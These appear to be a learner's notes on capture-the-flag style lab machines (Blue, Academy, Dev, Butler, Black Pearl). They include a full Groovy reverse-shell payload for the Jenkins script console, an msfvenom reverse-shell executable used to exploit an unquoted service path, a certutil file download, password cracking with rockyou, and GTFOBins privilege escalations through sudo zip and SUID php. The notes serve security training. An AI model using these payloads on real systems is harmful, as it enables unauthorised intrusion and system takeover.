###### Walk through - Blue
SMB exploit related vulnerability Eternal Blue attack - #MS17-010

###### Walk through - Academy
Linux machine 
vulnerable to anonymous login

`hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt`
**-m 0** - mentions the module of #md5

#directorylisting #directorybusting
`ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -u http://sitename/FUZZ`
#fuzz the site using ffuf tool

[[crontab]]will run in a periodic execution, whenever the systems restarts. [jobscheduler]

#pspy - listing out all the process running in machine
#Resource: https://github.com/DominicBreuker/pspy

###### Walk through - Dev

nfs - network file share 
(Remote procedure call - you can use the RPC on client/ server applications which uses windows OS)

IPC                                             vs                   RPC
communication with in devices            communication across devices
integrated keyboard, USB devices       workstations and different machines

if the machine exposed the ==nfs== during nmap scan must try this below command

`showmount -e TargetmachineIP`
`mkdir /mnt/dev`
`mount -t nfs TargetmachineIP:/srv/nfs /mnt/dev`


Cracking the zip password  - **fcrackzip**
`fcrack -v -u -D -p /usr/share/wordlists/rockyou.txt CrackFile.zip`
-v verbose
-u unzip
-D dictionary based 
-p path of the passwords file

Login to #SSH without password using #id_rsa file
`ssh -i id_rsa user@machineIP`

#privilegeescalation on sudo zip using #gtfobins

```bash
K=$(mktemp -u) #make temporary memory in /tmp folder
sudo zip $K /etc/hosts -T -TT 'sh #' 

#creating an hosts file as zip in mktemp 
#-T denotes test zip file integrity, it will check the integrity of the archieve without extracting the file.
#-TT incorrect flag
#'sh #' tries to include the comment as a command and it included as single quotes, which does treated as comment. Instead it will be treated as FileName.	 
```



###### Walk through - Butler

Windows Machine
Windows privilege Escalation 

hacktricks Jenkins

Burpsuite 
	Pitch fork - credentials stuffing with same admin name try with different passwords. 
	cluster bomb - try with diff username and diff passwords

#References: https://cloud.hacktricks.xyz/pentesting-ci-cd/jenkins-security
Logged in with jenkins/jenkins
Status -> Manage Jenkins -> script console

jenkins exploit -> checking for groovy script reverse shell

```groovy
String host="localhost";
int port=8044;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

Go ahead and run in the script console tab and get a listener opened in attacker machine.

understand about the system information by using these two commands.

`whoami`
`systeminfo`

Similar to wget -> windows having certutil.exe

`certulil.exe -urlcache -f http://ip/file_name File_saving_name`

while running winpeas (windows privilege escalation awesome scripts), you wouldn't be able to get the colors. so it may cause a difficult to understand the severity.
Because ANSI color bit is not default in windows.
To resolve this follow the steps[not applicable for some low level users ] 
1) `REG ADD HKCU\Console /v VirtualTerminalLeve /t REG_DWORD /d 1`
2) Then run the `winpease.exe`

[[PotatoAttack]] - SeImpersonatePrivilege

: With quotes and space =="`C:\Program Files`"==  - it will check the whole path for the exe file 
![[Pasted image 20230714082217.png]]

Vulnerable : Without quotes and space ==`C:\Program Files`== - it will check whether each word is exe or not.
![[Pasted image 20230714082258.png]]

If the file path given without quotes, machine will check before the space whether each word is executable file or not. just like 
`C:\Program.exe` or
`C:\Program Files.exe` or
`C:\Program Files (x86)\Wise\Wise.exe`

So we can be able to inject the malicious file before the actual file. Malicious file runs before the original file. so attack can be able to get the privilege of administrator

Unquoted service path:
![[Pasted image 20230714082606.png]]

Windows Malware generate reverse shell:
`msfvenom -p windows/x64/shell_reverse_tcp LHOST=AttackerMachine LPORT=1232 -f exe > Wise.exe`

#windowsserviceStopping 
`sc stop WiseBootAssistant` - stopping of windows services
`sc query WiseBootAssistant` - status of windows services
`sc start WiseBootAssistant` - starting of windows services

After Successful Privilege Escalation on Windows:
![[Pasted image 20230714084550.png]]

###### Walk through - Black Pearl
Linux Machine

#dnsrecon
``` bash
dnsrecon -r 127.0.0.0/24 -n 192.168.23.24 -d somedomain.com

# -r range of ip's
# -n NS_SERVER name server of the ip
# -d domain
```


SUID - Super user identifier
-==rws== r-x r-x = User having super user privileges to run the binary file. Also we can abuse it for an privilege escalation.
SGIP - Super Group identifier
-rwx ==rws== r-x = Group having super user privileges to run the binary file and able to do the privilege escalation.

#find #search 
```bash
find / -type f -perm -4000 2>/dev/null

# / = root directory
# -type f = file type
# -perm -4000 = file permission check for Set UID and other no permissions
# 2>/dev/null = redirects the error output(stderr) to the null device. Discaring the error message while doing the search

''' Read (4) + Write (2) + Execute (1) = 1 (RWX)
	Read (4) + Execute (1) = 5 (RE)
	Write (2) = 2 (W)
'''
```

Privilege Escalation with #gtfobins 
suid in php 

```bash
./php -r "pcntl_exec('/bin/sh', ['-p']);"
```
